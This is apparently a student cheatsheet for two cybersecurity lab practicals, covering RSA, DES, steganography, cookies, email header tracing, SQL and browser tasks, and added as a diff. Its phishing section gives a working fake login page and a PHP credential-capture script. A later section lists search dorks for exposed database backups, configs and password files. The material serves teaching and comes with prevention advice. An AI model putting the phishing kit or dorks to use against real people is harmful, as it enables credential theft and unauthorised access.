@@ -1,0 +1,466 @@
+# Day 2 Practical Cheatsheet
+## MSEI-025 (10 AM) + MSEI-023 (2 PM)
+
+---
+
+# MSEI-025 | Q1: Phishing Attack Demonstration
+
+**Definition**
+Phishing is a social engineering attack where an attacker creates a fake login page to harvest user credentials. The victim is deceived into submitting real credentials to an attacker-controlled server.
+
+**Steps**
+1. Create fake login page: login.html
+2. Create credential capture script: capture.php
+3. Start Apache server: `sudo systemctl start apache2`
+4. Victim opens `http://<attacker-IP>/login.html` and submits credentials
+5. capture.php writes credentials to captured.txt and redirects victim to real site
+6. Attacker reads captured.txt for plaintext credentials
+
+**login.html**
+```html
+<form action="capture.php" method="POST">
+  Username: <input type="text" name="user">
+  Password: <input type="password" name="pass">
+  <input type="submit" value="Login">
+</form>
+```
+
+**capture.php**
+```php
+<?php
+  $user = $_POST["user"]; $pass = $_POST["pass"];
+  file_put_contents("captured.txt", "$user:$pass\n", FILE_APPEND);
+  header("Location: https://realsite.com");
+?>
+```
+
+**Attack Flow**
+```
+Victim --> [Fake Page] --> credentials saved to captured.txt
+                      --> victim redirected to real site (suspects nothing)
+```
+
+**Prevention**
+- HTTPS with valid CA cert on all pages (fake sites typically use HTTP)
+- Email anti-phishing gateway, SPF/DKIM/DMARC to block spoofed domains
+- Multi-factor authentication (stolen password alone is not enough)
+- User awareness training: verify URL before submitting credentials
+
+**Viva**
+The redirect is the social engineering element. Victim has no indication anything went wrong. No patch fixes phishing; it exploits trust, not a technical vulnerability.
+
+---
+
+# MSEI-025 | Q2: Asymmetric Encryption (RSA)
+
+**Definition**
+RSA is an asymmetric encryption algorithm using a mathematically linked key pair. Public key encrypts; private key decrypts. Sender uses receiver's public key. Only the receiver's private key can decrypt.
+
+**Steps**
+1. Generate 2048-bit RSA private key
+2. Extract corresponding public key
+3. Create plaintext message file
+4. Encrypt using public key
+5. Decrypt using private key
+6. Verify output matches original plaintext
+
+**Commands**
+```bash
+openssl genrsa -out private.pem 2048
+openssl rsa -in private.pem -pubout -out public.pem
+echo 'Confidential Message' > msg.txt
+openssl rsautl -encrypt -pubin -inkey public.pem -in msg.txt -out enc.bin
+openssl rsautl -decrypt -inkey private.pem -in enc.bin
+```
+
+**Key Concepts**
+
+| Property | Detail |
+|---|---|
+| Key size | 2048-bit minimum. 4096-bit for high security. |
+| Usage | RSA encrypts only a session key. AES encrypts the data. This is a hybrid cryptosystem. |
+| Real-world use | TLS handshake, SSH auth, S/MIME email, digital signatures |
+| Sign vs Encrypt | Signing: private key signs, public key verifies. Encryption is the reverse. |
+
+**Flow Diagram**
+```
+Sender                          Receiver
+Has receiver's public key       Has private key (secret)
+Encrypts msg with public key --> sends enc.bin
+                                Decrypts with private key
+                                Reads: 'Confidential Message'
+```
+
+**Viva**
+Why not use RSA for all data? RSA is computationally slow. AES is ~100x faster for bulk data. In TLS, RSA securely exchanges the AES session key; AES encrypts the actual traffic. If the private key is stolen, all past and future messages are compromised.
+
+---
+
+# MSEI-025 | Q3: Website Vulnerability Assessment
+
+**Definition**
+A vulnerability assessment is a systematic process of identifying, classifying, and prioritising security weaknesses in a web application. It uses automated tools to detect known vulnerabilities without exploiting them.
+
+**Steps**
+1. Define scope: target URL, scan type (black-box, unauthenticated)
+2. Run Nikto scan against the target
+3. Alternatively run OWASP ZAP active scan
+4. Collect findings: vulnerability name, severity, location
+5. Map each finding to OWASP Top 10
+6. Write remediation for each finding
+7. Assign overall risk rating
+
+**Commands**
+```bash
+nikto -h http://testphp.vulnweb.com -o report.txt
+# ZAP CLI alternative:
+zap-cli quick-scan http://testphp.vulnweb.com
+```
+
+**Assessment Report**
+
+| Vulnerability | Severity | Remediation |
+|---|---|---|
+| SQL Injection (login form) | Critical | Use parameterised queries |
+| Reflected XSS (search field) | High | Input validation + output encoding |
+| No HTTPS | High | Enable TLS 1.2+, redirect port 80 to 443 |
+| Directory listing enabled | Medium | Disable in server config |
+| Outdated Apache version | Medium | Patch to latest stable |
+| Missing security headers | Low | Add X-Frame-Options, CSP header |
+
+**OWASP Top 10 Mapping**
+- SQL Injection, XSS -> A03: Injection
+- No HTTPS -> A02: Cryptographic Failures
+- Directory listing, missing headers -> A05: Security Misconfiguration
+- Outdated Apache -> A06: Vulnerable and Outdated Components
+
+**Viva**
+Difference between vulnerability scan and penetration test: scan identifies weaknesses, pen test actively exploits them to prove impact. Black-box testing mimics an external attacker with no prior knowledge of the system.
+
+---
+
+# MSEI-025 | Q4: Hit Counter Using Cookies (PHP)
+
+**Definition**
+A cookie is a small key-value pair stored in the browser and sent back to the server with every HTTP request. This program uses a cookie to track how many times a user has visited a page.
+
+**Steps**
+1. Create counter.php in the web server document root
+2. On each visit: check if visit_count cookie exists
+3. If yes: increment value. If no: set to 1.
+4. Set cookie with updated value and 1-hour expiry
+5. Display current count on the page
+6. Refresh browser multiple times to observe counter incrementing
+
+**counter.php**
+```php
+<?php
+  if (isset($_COOKIE['visit_count'])) {
+    $count = $_COOKIE['visit_count'] + 1;
+  } else {
+    $count = 1;
+  }
+  setcookie('visit_count', $count, time() + 3600);
+  echo "You have visited $count time(s).";
+?>
+```
+
+**How Cookies Work**
+```
+First visit:  Browser --> GET /counter.php --> Server
+              Browser <-- Set-Cookie: visit_count=1 <-- Server
+
+Second visit: Browser --> GET /counter.php + Cookie: visit_count=1 --> Server
+              Browser <-- Set-Cookie: visit_count=2 <-- Server
+```
+
+**Cookie Security Attributes**
+
+| Attribute | Purpose |
+|---|---|
+| HttpOnly | Blocks JavaScript from reading the cookie. Prevents XSS-based cookie theft. |
+| Secure | Cookie sent only over HTTPS. Prevents interception on HTTP. |
+| SameSite | Restricts cross-site sending. Prevents CSRF attacks. |
+| Expires/Max-Age | Controls cookie lifetime. |
+
+**Viva**
+This counter is client-side controlled. A user can edit the cookie value in DevTools and set visit_count=9999. Server trusts the value sent back. Reliable counters store the count server-side in a database and use the cookie only as a session ID.
+
+---
+
+# MSEI-025 | Q5: Steganography + DES Encryption
+
+**Definitions**
+Steganography: hiding the existence of a message inside a carrier file (image, audio). The carrier looks unchanged to the naked eye.
+
+DES: Data Encryption Standard. Symmetric cipher. Same key encrypts and decrypts. 56-bit key, 64-bit block, 16 Feistel rounds. Now deprecated; replaced by AES.
+
+**Steganography Steps (steghide)**
+1. Install: `sudo apt install steghide`
+2. Create secret message: `echo 'Classified' > secret.txt`
+3. Embed into image: `steghide embed -cf image.jpg -ef secret.txt -p 'pass'`
+4. Image looks identical but now carries hidden data (LSB substitution)
+5. Extract: `steghide extract -sf image.jpg -p 'pass'`
+6. Verify: `cat secret.txt` shows original message
+
+**Steghide Commands**
+```bash
+steghide embed -cf cover.jpg -ef secret.txt -p 'mypassword'
+steghide extract -sf cover.jpg -p 'mypassword'
+```
+
+**DES Encryption Steps (OpenSSL)**
+1. Create plaintext: `echo 'Hello' > plain.txt`
+2. Encrypt: `openssl enc -des-ecb -in plain.txt -out enc.bin -k 'mykey'`
+3. Decrypt: `openssl enc -des-ecb -d -in enc.bin -out out.txt -k 'mykey'`
+4. Verify: `cat out.txt` shows 'Hello'
+
+**DES Commands**
+```bash
+openssl enc -des-ecb -in plain.txt -out enc.bin -k 'mykey'
+openssl enc -des-ecb -d -in enc.bin -out out.txt -k 'mykey'
+```
+
+**Comparison**
+
+| | Steganography | Encryption |
+|---|---|---|
+| Purpose | Hide existence of message | Hide content of message |
+| Output visible? | Carrier file looks normal | Ciphertext is visible |
+| Broken if method known? | Yes, if attacker has password | No, key still needed |
+| Combined use | Encrypt first, then hide = strongest approach | |
+
+**Viva**
+DES is broken. 56-bit key is brute-forceable (demonstrated in 1998, 22 hours). 3DES applies DES three times but is also being phased out. Current standard is AES-128/256. Steghide uses LSB substitution: replaces least significant bits of pixel colour values with message bits. Imperceptible to humans, detectable by steganalysis.
+
+---
+
+# MSEI-023 | Q1: MITM Attack on Shopping Cart
+
+**Definition**
+Client-side MITM: attacker intercepts and modifies data inside the browser (via DevTools) before it is sent to the server. The server receives manipulated values and processes them as legitimate because it performs no server-side price validation.
+
+**Steps**
+1. Create shopping_cart.html with a calculate() JavaScript function
+2. Open page in browser. Click Calculate. Grand Total = Rs 1,01,500.
+3. Press F12 to open DevTools. Go to Elements tab.
+4. Find: `<input type='text' id='rate1' value='50000'>`
+5. Double-click value '50000'. Change to '1'. Press Enter.
+6. Click Calculate again.
+7. New grand total = (1 x 2) + (500 x 3) = Rs 1,503.
+8. Server receives Rs 1,503 if no server-side validation exists.
+
+**shopping_cart.html (key parts)**
+```html
+<input type="text" id="rate1" value="50000">  <!-- attacker changes this -->
+<span id="grand">101500</span>
+
+<script>
+function calculate() {
+  var t = parseInt(document.getElementById("rate1").value)
+        * parseInt(document.getElementById("qty1").value);
+  document.getElementById("grand").innerHTML = t + t2;
+}
+</script>
+```
+
+**Attack Flow**
+```
+Normal:  Browser calculates 50000x2 + 500x3 = 101500 --> sent to server
+MITM:    Attacker edits rate1 to 1 in DOM
+         Browser calculates 1x2 + 500x3 = 1503 --> sent to server
+         Server trusts client value. Processes order at Rs 1503.
+```
+
+**Prevention**
+
+| Method | How it works |
+|---|---|
+| Server-side price validation | Server looks up price from its own DB. Never trusts client-submitted price. |
+| Signed price tokens | Server sends a hash of the price. Tampered value invalidates the hash. |
+| Session-based cart | Cart stored server-side. Client can change quantity only, not price. |
+| Input validation | Server rejects negative prices and prices outside catalogue range. |
+| HTTPS | Encrypts channel, but does NOT prevent DOM manipulation inside the browser. |
+
+**Viva**
+HTTPS does not prevent this attack. The manipulation happens inside the browser before the data is sent. HTTPS cannot validate what JavaScript calculated. This is why server-side validation is mandatory regardless of HTTPS.
+
+---
+
+# MSEI-023 | Q2: Search Engine Operators
+
+**Definition**
+Search engine operators are special syntax commands used to refine search results. In cyber security, they are used during the reconnaissance phase to gather publicly available information about a target. This is called Google Dorking or OSINT (Open Source Intelligence).
+
+**Operators Table**
+
+| Operator | Example | Function |
+|---|---|---|
+| `"exact phrase"` | `"information security policy"` | Returns pages with this exact string only |
+| `OR` | `firewall OR IDS` | Returns pages with either term |
+| `AND` | `security AND audit` | Returns pages with both terms |
+| `- (minus/NOT)` | `python -snake` | Excludes the word after minus |
+| `* (wildcard)` | `"* security framework"` | Asterisk matches any word in that position |
+| `site:` | `site:ignou.ac.in syllabus` | Searches only within specified domain |
+| `filetype:` | `filetype:pdf security policy` | Returns only specified file type |
+| `intitle:` | `intitle:"index of" passwords` | Finds pages with this text in the title |
+| `inurl:` | `inurl:admin login` | Finds pages with this text in the URL |
+| `cache:` | `cache:example.com` | Shows Google's cached version of the page |
+
+**Example Dorks**
+```
+filetype:sql site:targetcompany.com      -- exposed DB backups
+intitle:"index of" "wp-config.php"       -- exposed WordPress config
+inurl:/admin/login site:target.com       -- admin login panels
+filetype:xls "username" "password"       -- credential spreadsheets
+```
+
+**Viva**
+Using these techniques on systems you do not have authorisation to test is illegal under IT Act 2000 Section 43 (unauthorised access). This is passive reconnaissance only; you are querying Google's index, not the target directly. Always obtain written permission before conducting reconnaissance on any organisation.
+
+---
+
+# MSEI-023 | Q3: Browser Activities
+
+**Task 1: Delete Last Hour Browsing History**
+1. Press `Ctrl + Shift + Delete`
+2. Set time range: Last 1 hour
+3. Check: Browsing history, Cookies, Cached images
+4. Click Clear data
+
+**Task 2: Change Default Download Location**
+1. Settings > Downloads > Change
+2. Select new folder path
+3. All subsequent downloads go to this folder
+
+**Task 3: Modify Proxy Settings**
+1. Settings > System > Open proxy settings
+2. Manual proxy setup: enter proxy IP and port
+3. Save. All browser traffic now routes through the proxy.
+
+Security note: Attackers configure a victim's proxy to an attacker-controlled server to intercept all web traffic. This is one method of network-level MITM.
+
+**Task 4: Add 3 Bookmarks**
+1. Navigate to ignou.ac.in. Press `Ctrl + D`. Save.
+2. Navigate to egyankosh.ac.in. Press `Ctrl + D`. Save.
+3. Navigate to google.com. Press `Ctrl + D`. Save.
+
+**Task 5: View SSL/TLS Certificate**
+1. Navigate to `https://www.google.com`
+2. Click padlock icon in address bar
+3. Click Connection is secure > Certificate is valid
+4. Note: Subject, Issuer (CA), Valid From/To, Public key algorithm, Fingerprint
+
+**What the Certificate Proves**
+The certificate proves the server is who it claims to be. It is signed by a trusted Certificate Authority (CA). The browser verifies the signature using the CA's public key, which is pre-installed in the browser's trust store. Expired, self-signed, or domain-mismatched certificates trigger browser warnings.
+
+**Viva**
+Why does the browser trust the CA's signature? Every browser ships with a pre-installed list of trusted root CAs. When a server presents a certificate, the browser verifies the signature chain from the server cert back to a root CA in that list. If any link in the chain is broken or untrusted, the browser shows a warning.
+
+---
+
+# MSEI-023 | Q4: Email IP Tracing
+
+**Definition**
+Email headers contain routing information added by each mail server that handled the message. Analysing headers reveals the sender's mail server IP, timestamps, and routing path. Used in forensic investigations to trace email origin.
+
+**Steps**
+1. Send a test email (Gmail to Gmail)
+2. Open received email. Click three dots (more options) > Show original
+3. Read the Received: headers (bottom-most = origin point)
+4. Note the sender's public IP from the lowest Received: header
+5. Run WHOIS on the IP: `whois <IP>` or use mxtoolbox.com
+6. WHOIS output shows: organisation, country, ISP, ASN, abuse contact
+
+**Commands**
+```bash
+whois 203.0.113.25          # terminal WHOIS lookup
+nslookup 203.0.113.25       # reverse DNS lookup
+```
+
+**Sample Header (read bottom to top)**
+```
+Received: from [192.168.1.10] (client)
+        by mail.sender.com [203.0.113.25] at 10:15:28
+
+Received: from mail.sender.com [203.0.113.25]
+        by mx.gmail.com at 10:15:30
+```
+Sender's public IP = 203.0.113.25 (from the bottommost Received: header)
+
+**Flow Diagram**
+```
+Sender device (192.168.1.10)
+    |
+    v
+Sender's mail server (203.0.113.25)  <-- appears in headers
+    |
+    v
+Gmail's servers
+    |
+    v
+Recipient inbox --> Show original --> reveals 203.0.113.25
+```
+
+**Limitations**
+
+| Factor | Detail |
+|---|---|
+| What you see | Mail server IP (203.0.113.25), not the sender's device IP |
+| Why | Mail is relayed through the sender's mail server, not sent directly from their device |
+| VPN/Proxy | You see the VPN/proxy IP. Need court order to VPN provider for subscriber identity. |
+| Gmail | Google strips sender IP for privacy. You see Google's server IP. |
+
+**Viva**
+The From: header is easily spoofed by the sender. The Received: headers are written by mail servers, not the sender, and are more trustworthy. SPF (Sender Policy Framework) is a DNS record listing authorised sending IPs for a domain. Receiving servers check SPF to detect spoofed emails.
+
+---
+
+# MSEI-023 | Q5: Database Table Creation (SQL)
+
+**Definition**
+A relational database stores data in structured tables with rows and columns. SQL (Structured Query Language) is used to create tables, insert data, and run queries. PRIMARY KEY uniquely identifies each row and cannot be NULL or duplicate.
+
+**Create Table + Insert Records**
+```sql
+CREATE TABLE Parts (
+    ProdNo    INT           PRIMARY KEY,
+    PartName  VARCHAR(50)   NOT NULL,
+    Supplier  VARCHAR(50),
+    Price     DECIMAL(10,2)
+);
+
+INSERT INTO Parts VALUES (1,  'Bolt',   'SupplierA', 10.50);
+INSERT INTO Parts VALUES (2,  'Nut',    'SupplierB',  5.00);
+INSERT INTO Parts VALUES (3,  'Washer', 'SupplierC',  2.50);
+INSERT INTO Parts VALUES (4,  'Screw',  'SupplierA',  8.00);
+INSERT INTO Parts VALUES (5,  'Nail',   'SupplierD',  1.00);
+INSERT INTO Parts VALUES (6,  'Rivet',  'SupplierB',  3.50);
+INSERT INTO Parts VALUES (7,  'Pin',    'SupplierC',  4.00);
+INSERT INTO Parts VALUES (8,  'Clamp',  'SupplierA', 15.00);
+INSERT INTO Parts VALUES (9,  'Hook',   'SupplierD',  7.50);
+INSERT INTO Parts VALUES (10, 'Ring',   'SupplierB', 12.00);
+```
+
+**Queries**
+```sql
+SELECT * FROM Parts;                               -- all records
+SELECT * FROM Parts WHERE Price > 5.00;            -- filter by price
+SELECT * FROM Parts WHERE Supplier = 'SupplierA';  -- filter by supplier
+SELECT PartName, Price FROM Parts ORDER BY Price DESC; -- sort
+SELECT COUNT(*) FROM Parts;                        -- total count
+SELECT AVG(Price) FROM Parts;                      -- average price
+```
+
+**Data Type Reference**
+
+| Data Type | Purpose |
+|---|---|
+| INT | Whole numbers. Used for IDs and counts. |
+| VARCHAR(n) | Variable-length string up to n characters. Efficient storage. |
+| DECIMAL(10,2) | Fixed-point number. 10 digits total, 2 after decimal. Correct for currency (avoids floating point rounding errors). |
+| NOT NULL | Constraint. Field must have a value. Cannot be left empty. |
+| PRIMARY KEY | Uniquely identifies each row. No duplicates. Cannot be NULL. |
+
+**Viva**
+Why DECIMAL and not FLOAT for price? FLOAT uses binary floating point which causes rounding errors (e.g., 0.1 + 0.2 = 0.30000000000000004). DECIMAL stores exact values. Critical for financial data. Why VARCHAR and not CHAR? CHAR always uses n bytes even if the string is shorter. VARCHAR uses only what the string needs, saving storage.
